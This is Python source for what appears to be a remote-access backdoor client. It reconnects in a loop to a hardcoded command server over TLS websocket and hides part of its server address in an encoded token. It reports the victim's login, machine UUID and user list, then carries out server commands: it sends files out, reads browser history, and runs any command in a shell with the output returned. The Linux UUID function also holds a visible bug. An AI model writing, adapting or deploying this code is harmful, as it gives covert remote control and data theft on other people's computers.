import asyncio
import json
import platform
import ssl

import websockets
import os
import subprocess
import time

from browsers.browser import get_browser_hist_path
from browsers.history import paginate_history
from browsers.users import get_users
from utils import handle_cd, download_file, handle_ls, cert_text, solve_ssl, varify_cert

operating_system = platform.system().lower()


async def start_client():
    ssl_context = varify_cert(cert_text)
    cert_tex = ''
    update = False
    uri = "wss://192.168.88.70:8000/ws/client"

    while True:
        if update:
            ssl_context = varify_cert(cert_tex)
        try:
            async with websockets.connect(uri, ssl=ssl_context) as websocket:
                active = 0

                # get client details for admin.
                await websocket.send(".%.")
                time.sleep(0.001)
                username = os.getlogin()
                system_uuid, platform = get_system_uuid()
                response = {"username": username, "system_uuid": system_uuid, 'platform': platform}
                await websocket.send(json.dumps(response))

                while True:
                    print("Active status: ", active)
                    try:
                        while not active:
                            # wait until auto wake-up message received
                            print("waiting")
                            command = await websocket.recv()
                            active = command
                            time.sleep(0.001)
                            username = os.getlogin()
                            system_uuid, platform = get_system_uuid()
                            await websocket.send(f"cwd%`{os.getcwd()}")
                            users = get_users(dump=True)
                            response = {"username": username, "system_uuid": system_uuid, 'platform': platform, 'users': users}
                            await websocket.send(json.dumps(response))
                            continue

                        time.sleep(0.001)
                        # Receive command from the server
                        command = await websocket.recv()

                        if command.lower().startswith('switch'):
                            print("switched")
                            active = 0
                            continue
                        elif command.lower().startswith('%*&#!download'):
                            # Extracting filename from the command
                            _, filepath = command.split(' ', 1)
                            print(f"receive filepath {filepath}")
                            await websocket.send(f"%*&#!download {filepath}")

                            await download_file(websocket, filepath=f"{os.getcwd()}/{filepath}")
                            continue
                        elif command.lower().startswith('history'):
                            await websocket.send("history")
                            try:
                                signel, user, brows_name = command.split(' ', maxsplit=2)
                                hist_path = get_browser_hist_path(user, brows_name)
                                hist = paginate_history(hist_path, offset=0, limit=10)
                                await websocket.send(hist)
                                continue
                            except ValueError:
                                hist = get_users()
                                await websocket.send(hist)
                                continue

                        cd_result = handle_cd(command)
                        if cd_result:
                            # response = modify_result(result.stdout)
                            await websocket.send("ls")
                            time.sleep(0.001)
                            await websocket.send(json.dumps(cd_result))
                            continue

                        # Send the result back to the server
                        elif command.lower().startswith('ls'):
                            cwd = os.getcwd()
                            response = handle_ls(cwd)
                            response['cwd'] = cwd
                            # response = modify_result(result.stdout)
                            await websocket.send("ls")
                            time.sleep(0.001)
                            await websocket.send(json.dumps(response))
                            continue

                        result = subprocess.run(command, shell=True, capture_output=True, text=True)

                        # Handle if the command returns nothing
                        if result.stdout == "":
                            await websocket.send("Null")
                            continue

                        await websocket.send(result.stdout)
                        continue

                    except Exception as e:
                        # Send any errors back to the server
                        await websocket.send(str(e))
                        continue
        except websockets.exceptions.ConnectionClosedError:
            print("Connection closed. Retrying in 3 seconds...")
            time.sleep(3)
        except ssl.SSLCertVerificationError:
            update = True
            cert_tex = solve_ssl(ssl_session_token="a3d3c3Y6Ly8xOTIuMTY4Ljg4LjcwOjgwMDAvamh3LWZodXdsaWxmZHdo")
            print("SSL certificate verification failed. Retrying in 3 seconds...")
            time.sleep(3)
        except Exception as e:
            print(f"Connection failed: {e}")
            print("Retrying in 3 seconds...")
            time.sleep(3)
        finally:
            print("Closing connection")


def get_system_uuid():
    if operating_system == 'linux':
        try:
            with open('/etc/machine-id', 'r') as file:
                return file.read().strip()
        except FileNotFoundError:
            return None, None

    elif operating_system == 'windows':
        try:
            # get hardware level uuid unchanged on reinstall OS
            result = subprocess.run(["wmic", "csproduct", "get", "UUID"], capture_output=True, text=True)
            output = result.stdout.strip().split("\n")[-1].strip()
            return output, operating_system
        except subprocess.CalledProcessError as e:
            print(e)
            return None, None

    return None, None


if __name__ == "__main__":
    asyncio.run(start_client())